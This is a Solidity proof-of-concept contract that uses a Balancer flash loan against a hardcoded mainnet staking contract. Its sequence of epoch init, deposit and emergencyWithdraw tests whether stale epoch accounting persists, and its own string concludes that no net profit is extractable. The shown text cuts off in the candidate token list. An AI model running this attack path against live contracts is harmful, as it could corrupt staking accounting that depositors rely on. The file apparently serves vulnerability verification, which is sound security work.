// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IStaking {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function emergencyWithdraw(address tokenAddress) external;
    function manualEpochInit(address[] calldata tokens, uint128 epochId) external;
    function getEpochUserBalance(address user, address token, uint128 epochId) external view returns (uint256);
    function getEpochPoolSize(address tokenAddress, uint128 epochId) external view returns (uint256);
    function getCurrentEpoch() external view returns (uint128);
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function balanceOf(address user, address token) external view returns (uint256);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    address public constant TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    string public constant EXPLOIT_PATH_USED =
        "fresh non-stable pool -> if untouched manualEpochInit(0..current) -> flash-borrow minimal capital -> deposit(token, amount, referrer=0) -> emergencyWithdraw(token) -> stale epoch user/pool getters remain positive";

    string public constant PROFIT_PATH =
        "Target-only result: stale epoch accounting is validated, but no positive net token profit is realizable from Staking alone because the only callable path here returns principal and the contract exposes no reward-claim or value-extraction leg tied to those stale getters.";

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public exploitToken;
    uint256 public flashLoanAmount;
    uint128 public exploitEpoch;

    uint256 public liveUserBalanceAfter;
    uint256 public livePoolBalanceBefore;
    uint256 public livePoolBalanceAfter;
    uint256 public staleUserBalanceCurrentEpoch;
    uint256 public staleUserBalanceNextEpoch;
    uint256 public stalePoolSizeCurrentEpoch;
    uint256 public stalePoolSizeNextEpoch;

    address public lastAttemptedToken;
    string public failureReason;

    address private _pendingToken;
    uint256 private _pendingAmount;

    constructor() {}

    function execute() external {
        _run();
    }

    function run() external {
        _run();
    }

    function verify() external {
        _run();
    }

    function exploitPathUsed() external pure returns (string memory) {
        return EXPLOIT_PATH_USED;
    }

    function profitPath() external pure returns (string memory) {
        return PROFIT_PATH;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function attemptToken(address token) external {
        require(msg.sender == address(this), "self only");
        require(token != address(0), "token=0");

        IStaking staking = IStaking(TARGET);
        uint128 currentEpoch = staking.getCurrentEpoch();
        require(currentEpoch >= 10, "current epoch < 10");

        if (!staking.epochIsInitialized(token, 0)) {
            _ensureEpochChainInitialized(token, currentEpoch);
        }

        uint256 amount = 1;
        _pendingToken = token;
        _pendingAmount = amount;

        IERC20Minimal[] memory tokens = new IERC20Minimal[](1);
        tokens[0] = IERC20Minimal(token);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
        require(hypothesisValidated, "path did not validate");
    }

    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not vault");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad flashloan arrays");
        require(address(tokens[0]) == _pendingToken, "wrong token");
        require(amounts[0] == _pendingAmount, "wrong amount");

        address token = _pendingToken;
        uint256 amount = _pendingAmount;
        uint256 fee = feeAmounts[0];
        IStaking staking = IStaking(TARGET);

        exploitToken = token;
        flashLoanAmount = amount;
        exploitEpoch = staking.getCurrentEpoch();

        livePoolBalanceBefore = _balanceOf(token, TARGET);

        _forceApprove(token, TARGET, amount);
        staking.deposit(token, amount, address(0));
        staking.emergencyWithdraw(token);

        liveUserBalanceAfter = staking.balanceOf(address(this), token);
        livePoolBalanceAfter = _balanceOf(token, TARGET);
        staleUserBalanceCurrentEpoch = staking.getEpochUserBalance(address(this), token, exploitEpoch);
        staleUserBalanceNextEpoch = staking.getEpochUserBalance(address(this), token, exploitEpoch + 1);
        stalePoolSizeCurrentEpoch = staking.getEpochPoolSize(token, exploitEpoch);
        stalePoolSizeNextEpoch = staking.getEpochPoolSize(token, exploitEpoch + 1);

        uint256 selfBalanceBeforeRepay = _balanceOf(token, address(this));
        require(selfBalanceBeforeRepay >= amount + fee, "principal not recovered or flash fee unsupported");

        hypothesisValidated =
            liveUserBalanceAfter == 0 &&
            livePoolBalanceAfter == livePoolBalanceBefore &&
            staleUserBalanceNextEpoch >= amount &&
            stalePoolSizeNextEpoch >= livePoolBalanceBefore + amount;
        require(hypothesisValidated, "stale accounting not observed");

        _transfer(token, BALANCER_VAULT, amount + fee);

        uint256 netBalance = _balanceOf(token, address(this));
        _profitToken = token;
        _profitAmount = netBalance;
        profitAchieved = netBalance > 0;

        _pendingToken = address(0);
        _pendingAmount = 0;
    }

    function _run() internal {
        require(!executed, "already executed");
        executed = true;

        uint256 count = _candidateCount();
        for (uint256 index = 0; index < count; ++index) {
            address token = _candidate(index);
            if (token == address(0)) {
                continue;
            }

            lastAttemptedToken = token;

            try this.attemptToken(token) {
                if (hypothesisValidated) {
                    return;
                }
            } catch Error(string memory reason) {
                failureReason = reason;
            } catch {
                failureReason = "low-level attempt failure";
            }
        }

        hypothesisRefuted = true;
        _profitToken = address(0);
        _profitAmount = 0;
        profitAchieved = false;

        if (bytes(failureReason).length == 0) {
            failureReason = "no built-in candidate satisfied the strict exploit path on this fork";
        }
    }

    function _ensureEpochChainInitialized(address token, uint128 currentEpoch) internal {
        IStaking staking = IStaking(TARGET);
        address[] memory tokens = new address[](1);
        tokens[0] = token;

        staking.manualEpochInit(tokens, 0);
        for (uint128 epochId = 1; epochId <= currentEpoch; ++epochId) {
            staking.manualEpochInit(tokens, epochId);
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account));
        require(ok && data.length >= 32, "balanceOf failed");
        value = abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
    }

    function _transfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "token call failed");
        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "token op failed");
        }
    }

    function _candidateCount() internal pure returns (uint256) {
        return 30;
    }

    function _candidate(uint256 index) internal pure returns (address) {
        if (index == 0) return 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        if (index == 1) return 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC
        if (index == 2) return 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK
